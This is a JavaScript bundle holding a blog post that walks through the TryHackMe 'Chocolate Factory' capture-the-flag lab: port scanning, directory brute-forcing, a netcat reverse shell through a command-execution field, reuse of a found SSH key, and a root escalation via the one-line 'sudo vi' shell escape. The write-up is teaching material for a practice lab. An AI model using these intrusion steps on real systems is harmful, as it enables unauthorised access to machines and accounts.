"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[5116],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return d}});var _=n(7294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var _=Object.getOwnPropertySymbols(e);t&&(_=_.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,_)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function r(e,t){if(null==e)return{};var n,_,o=function(e,t){if(null==e)return{};var n,_,o={},i=Object.keys(e);for(_=0;_<i.length;_++)n=i[_],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(_=0;_<i.length;_++)n=i[_],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var s=_.createContext({}),l=function(e){var t=_.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},p=function(e){var t=l(e.components);return _.createElement(s.Provider,{value:t},e.children)},c={inlineCode:"code",wrapper:function(e){var t=e.children;return _.createElement(_.Fragment,{},t)}},u=_.forwardRef((function(e,t){var n=e.components,o=e.mdxType,i=e.originalType,s=e.parentName,p=r(e,["components","mdxType","originalType","parentName"]),u=l(n),d=o,h=u["".concat(s,".").concat(d)]||u[d]||c[d]||i;return n?_.createElement(h,a(a({ref:t},p),{},{components:n})):_.createElement(h,a({ref:t},p))}));function d(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var i=n.length,a=new Array(i);a[0]=u;var r={};for(var s in t)hasOwnProperty.call(t,s)&&(r[s]=t[s]);r.originalType=e,r.mdxType="string"==typeof e?e:o,a[1]=r;for(var l=2;l<i;l++)a[l]=n[l];return _.createElement.apply(null,a)}return _.createElement.apply(null,n)}u.displayName="MDXCreateElement"},9444:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return r},contentTitle:function(){return s},metadata:function(){return l},assets:function(){return p},toc:function(){return c},default:function(){return d}});var _=n(7462),o=n(3366),i=(n(7294),n(3905)),a=["components"],r={slug:"chocolateFactory",tags:["FTP","vi","id_rsa"],authors:["shivam"],title:"THM ChocolateFactory",image:"https://tryhackme-images.s3.amazonaws.com/room-icons/e2eed78e92b4890174e0a2510b6e7a7c.jpeg"},s=void 0,l={permalink:"/Cybernotes/blog/chocolateFactory",source:"@site/blog/2022-02-26-Chocolatefactory/index.md",title:"THM ChocolateFactory",description:"Hello everyone,",date:"2022-02-26T00:00:00.000Z",formattedDate:"February 26, 2022",tags:[{label:"FTP",permalink:"/Cybernotes/blog/tags/ftp"},{label:"vi",permalink:"/Cybernotes/blog/tags/vi"},{label:"id_rsa",permalink:"/Cybernotes/blog/tags/id-rsa"}],readingTime:5.755,truncated:!0,authors:[{name:"0xSH1V4M",title:"Author",url:"https://github.com/shivam1317",imageURL:"https://avatars.githubusercontent.com/u/70281451?v=4",key:"shivam"}],frontMatter:{slug:"chocolateFactory",tags:["FTP","vi","id_rsa"],authors:["shivam"],title:"THM ChocolateFactory",image:"https://tryhackme-images.s3.amazonaws.com/room-icons/e2eed78e92b4890174e0a2510b6e7a7c.jpeg"},nextItem:{title:"THM Develpy writeup",permalink:"/Cybernotes/blog/2022/02/26/Develpy"}},p={authorsImageUrls:[void 0]},c=[{value:"Nmap results",id:"nmap-results",children:[],level:2},{value:"FTP",id:"ftp",children:[],level:2},{value:"Enumration",id:"enumration",children:[],level:2},{value:"Privesc",id:"privesc",children:[],level:2}],u={toc:c};function d(e){var t=e.components,r=(0,o.Z)(e,a);return(0,i.kt)("wrapper",(0,_.Z)({},u,r,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"Hello everyone,"),(0,i.kt)("p",null,"Today we are going to solve the chocolate factory machine from tryhackme. we will see how we can enumrate FTP,SSH and how to do privesc with vi."),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://tryhackme-images.s3.amazonaws.com/room-icons/e2eed78e92b4890174e0a2510b6e7a7c.jpeg",alt:null})),(0,i.kt)("p",null,"So let's start.."),(0,i.kt)("h2",{id:"nmap-results"},"Nmap results"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"PORT    STATE SERVICE    VERSION\n21/tcp  open  ftp        vsftpd 3.0.3\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.9.10.10\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\n| ssh-hostkey:\n|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)\n|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)\n|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)\n80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n100/tcp open  newacct?\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\n| fingerprint-strings:\n|   GenericLines, NULL:\n|     \"Welcome to chocolate room!!\n|     ___.---------------.\n|     .'__'__'__'__'__,` . ____ ___ \\r\n|     _:\\x20 |:. \\x20 ___ \\r\n|     \\'__'__'__'__'_`.__| `. \\x20 ___ \\r\n|     \\'__'__'__\\x20__'_;-----------------`\n|     \\|______________________;________________|\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\n|_    hope you wont drown Augustus\"\n106/tcp open  pop3pw?\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\n| fingerprint-strings:\n|   GenericLines, NULL:\n|     \"Welcome to chocolate room!!\n|     ___.---------------.\n|     .'__'__'__'__'__,` . ____ ___ \\r\n|     _:\\x20 |:. \\x20 ___ \\r\n|     \\'__'__'__'__'_`.__| `. \\x20 ___ \\r\n|     \\'__'__'__\\x20__'_;-----------------`\n|     \\|______________________;________________|\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\n|_    hope you wont drown Augustus\"\n109/tcp open  pop2?\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\n| fingerprint-strings:\n|   GenericLines, NULL:\n|     \"Welcome to chocolate room!!\n|     ___.---------------.\n|     .'__'__'__'__'__,` . ____ ___ \\r\n|     _:\\x20 |:. \\x20 ___ \\r\n|     \\'__'__'__'__'_`.__| `. \\x20 ___ \\r\n|     \\'__'__'__\\x20__'_;-----------------`\n|     \\|______________________;________________|\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\n|_    hope you wont drown Augustus\"\n110/tcp open  pop3?\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\n| fingerprint-strings:\n|   GenericLines, NULL:\n|     \"Welcome to chocolate room!!\n|     ___.---------------.\n|     .'__'__'__'__'__,` . ____ ___ \\r\n|     _:\\x20 |:. \\x20 ___ \\r\n|     \\'__'__'__'__'_`.__| `. \\x20 ___ \\r\n|     \\'__'__'__\\x20__'_;-----------------`\n|     \\|______________________;________________|\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\n|_    hope you wont drown Augustus\"\n111/tcp open  rpcbind?\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\n| fingerprint-strings:\n|   NULL, RPCCheck:\n|     \"Welcome to chocolate room!!\n|     ___.---------------.\n|     .'__'__'__'__'__,` . ____ ___ \\r\n|     _:\\x20 |:. \\x20 ___ \\r\n|     \\'__'__'__'__'_`.__| `. \\x20 ___ \\r\n|     \\'__'__'__\\x20__'_;-----------------`\n|     \\|______________________;________________|\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\n|_    hope you wont drown Augustus\"\n113/tcp open  ident?\n| fingerprint-strings:\n|   DNSVersionBindReqTCP, GenericLines, GetRequest, NULL, RTSPRequest, TLSSessionReq, ms-sql-s:\n|_    http://localhost/key_rev_key <- You will find the key here!!!\n119/tcp open  nntp?\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\n| fingerprint-strings:\n|   GenericLines, NULL:\n|     \"Welcome to chocolate room!!\n|     ___.---------------.\n|     .'__'__'__'__'__,` . ____ ___ \\r\n|     _:\\x20 |:. \\x20 ___ \\r\n|     \\'__'__'__'__'_`.__| `. \\x20 ___ \\r\n|     \\'__'__'__\\x20__'_;-----------------`\n|     \\|______________________;________________|\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\n|_    hope you wont drown Augustus\"\n125/tcp open  locus-map?\n|_auth-owners: ERROR: Script execution failed (use -d to debug)\n| fingerprint-strings:\n|   GenericLines, NULL:\n|     \"Welcome to chocolate room!!\n|     ___.---------------.\n|     .'__'__'__'__'__,` . ____ ___ \\r\n|     _:\\x20 |:. \\x20 ___ \\r\n|     \\'__'__'__'__'_`.__| `. \\x20 ___ \\r\n|     \\'__'__'__\\x20__'_;-----------------`\n|     \\|______________________;________________|\n|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)\n|_    hope you wont drown Augustus\"\n")),(0,i.kt)("h2",{id:"ftp"},"FTP"),(0,i.kt)("p",null,"--\x3e I got this image file on ftp"),(0,i.kt)("p",null,"![","[Pasted image 20211226115707.png]","]"),(0,i.kt)("p",null,"But i found nothing in that image so we have to do something else."),(0,i.kt)("h2",{id:"enumration"},"Enumration"),(0,i.kt)("p",null,"--\x3e I found this login page on port ",(0,i.kt)("inlineCode",{parentName:"p"},"80")),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(8479).Z,width:"1723",height:"707"})),(0,i.kt)("p",null,"--\x3e After that i brute forced it with some extensions like ",(0,i.kt)("inlineCode",{parentName:"p"},"php"),",",(0,i.kt)("inlineCode",{parentName:"p"},"js")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"html")," with the help of gobuster and i found the ",(0,i.kt)("inlineCode",{parentName:"p"},"/home.php")," page"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"===============================================================\n/.htpasswd.js         (Status: 403) [Size: 278]\n/.htaccess            (Status: 403) [Size: 278]\n/.htpasswd.html       (Status: 403) [Size: 278]\n/.htaccess.php        (Status: 403) [Size: 278]\n/.htpasswd            (Status: 403) [Size: 278]\n/.htaccess.js         (Status: 403) [Size: 278]\n/.htpasswd.php        (Status: 403) [Size: 278]\n/.htaccess.html       (Status: 403) [Size: 278]\n/home.php             (Status: 200) [Size: 569]\n/index.html           (Status: 200) [Size: 1466]\n/server-status        (Status: 403) [Size: 278]\n/validate.php         (Status: 200) [Size: 93]\n===============================================================\n")),(0,i.kt)("p",null,"--\x3e After going to that directory i found that there is a one input field which is executing the commands so i tried to add netcat reverse shell and i got the reverse shell !"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(9987).Z,width:"1595",height:"697"})),(0,i.kt)("p",null,"--\x3e Also i found one sentence in nmap results which looks like this:"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(8345).Z,width:"1381",height:"227"})),(0,i.kt)("p",null,"--\x3e So i tried to go in ",(0,i.kt)("inlineCode",{parentName:"p"},"http://ip/key_rev_key")," and found one file !"),(0,i.kt)("p",null,"I have given all permissions (777) to this file and when i ran it i found this:"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(5401).Z,width:"779",height:"135"})),(0,i.kt)("p",null,"--\x3e so i ran ",(0,i.kt)("inlineCode",{parentName:"p"},"strings")," on this file and found the key !"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(174).Z,width:"831",height:"209"})),(0,i.kt)("p",null,"--\x3e So now let's continue with the reverse shell which we have found !"),(0,i.kt)("p",null,"And i found the ",(0,i.kt)("inlineCode",{parentName:"p"},"id_rsa")," key for the user ",(0,i.kt)("inlineCode",{parentName:"p"},"charlie")," in ",(0,i.kt)("inlineCode",{parentName:"p"},"/home/charlie/teleport")," so let's grab that and give it ",(0,i.kt)("inlineCode",{parentName:"p"},"600")," permission and login as charlie!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"chmod 600 id_rsa\nssh -i id_rsa charlie@id_rsa\n")),(0,i.kt)("p",null,"--\x3e And we got logged in as ",(0,i.kt)("inlineCode",{parentName:"p"},"charlie")," and found the ",(0,i.kt)("inlineCode",{parentName:"p"},"user")," flag!"),(0,i.kt)("p",null,"And also we missed this question !"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"What is Charlie's password?")),(0,i.kt)("p",null,"So i found it in ",(0,i.kt)("inlineCode",{parentName:"p"},"validate.php")," file inside ",(0,i.kt)("inlineCode",{parentName:"p"},"/var/www/html/")),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(8981).Z,width:"1243",height:"279"})),(0,i.kt)("p",null,"--\x3e And now let's continue with the privesc part!"),(0,i.kt)("h2",{id:"privesc"},"Privesc"),(0,i.kt)("p",null,"First of all i done ",(0,i.kt)("inlineCode",{parentName:"p"},"sudo -l")," and found that we can run ",(0,i.kt)("inlineCode",{parentName:"p"},"/usr/bin/vi")," as root so let's goto gtfobins and find command to privesc"),(0,i.kt)("p",null,"and i found this command:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"sudo /usr/bin/vi -c ':!/bin/sh' /dev/null\n")),(0,i.kt)("p",null,"--\x3e And boom i got root !"),(0,i.kt)("p",null,"so let's get the ",(0,i.kt)("inlineCode",{parentName:"p"},"root")," flag but wait i found one file there called ",(0,i.kt)("inlineCode",{parentName:"p"},"root.py")," so we are not done yet!"),(0,i.kt)("p",null,"When i have cat that file i found that it's getting key from user and decoding something:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-py"},'import pyfiglet\nkey=input("Enter the key:  ")\nf=Fernet(key)\nencrypted_mess= \'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAA\nKyJQDHNvQaJ\'\ndcrypt_mess=f.decrypt(encrypted_mess)\nmess=dcrypt_mess.decode()\ndisplay1=pyfiglet.figlet_format("You Are Now The Owner Of ")\ndisplay2=pyfiglet.figlet_format("Chocolate Factory ")\nprint(display1)\nprint(display2)\n')),(0,i.kt)("p",null,"So i remembered that we found one key earlier so let's use it at the place of ",(0,i.kt)("inlineCode",{parentName:"p"},"key")," variable here and i done something like this:"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(3016).Z,width:"1649",height:"425"})),(0,i.kt)("p",null,"--\x3e So let's run that python file with ",(0,i.kt)("inlineCode",{parentName:"p"},"python root.py")," and i got my flag !"),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(1689).Z,width:"1451",height:"711"})),(0,i.kt)("p",null,"--\x3e And we have pwned the machine!"))}d.isMDXComponent=!0},8479:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211226123439-7ec6e78bb7b61a1c59f692caeb2f7ce6.png"},9987:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211226125200-abfad178087dd303620521d9f8841644.png"},8345:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211226125244-4fa721bafb7daa52e233dc34cd8433d6.png"},5401:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211226131120-adfc33e4b42a171aaac6feb9bf84890c.png"},174:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211226131743-451850e9b57c04b498e01c6cc0d3eae4.png"},8981:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211226132341-5c60603e0c79446c23271f0282e81c6b.png"},3016:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211226132802-28e3d3ae38cbc88adb8a4a626de6373d.png"},1689:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211226133446-a0c61976f7d7d470e2d651b4c341e424.png"}}]);